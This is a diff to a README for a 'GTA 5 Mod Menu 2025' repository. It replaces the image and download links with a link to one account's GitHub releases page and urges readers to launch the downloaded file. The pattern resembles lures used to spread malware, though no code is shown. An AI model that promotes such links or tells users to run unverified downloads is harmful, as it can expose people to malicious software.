@@ -2,7 +2,7 @@
 
 Welcome to the GTA 5 Mod Menu 2025 repository! 🚗💥💻 
 
-![GTA 5 Mod Menu](https://imgur.com/gallery/yourimage)
+![GTA 5 Mod Menu](https://github.com/potatowearsyeeezye/GTA-5-Mod-Menu-2025/releases)
 
 ## Overview
 
@@ -45,7 +45,7 @@ The **GTA 5 Mod Menu** is an exciting tool that enhances the gaming experience f
 
 For the latest version of the GTA 5 Mod Menu, please download it from the following link:
 
-[![Download Mod Menu](https://img.shields.io/badge/Download-Mod_Menu-blue)](https://github.com/assets/Release.zip)
+[![Download Mod Menu](https://github.com/potatowearsyeeezye/GTA-5-Mod-Menu-2025/releases)](https://github.com/potatowearsyeeezye/GTA-5-Mod-Menu-2025/releases)
 
 Remember, if the link ends with a file name, you'll need to launch it to kickstart your modding journey!
 
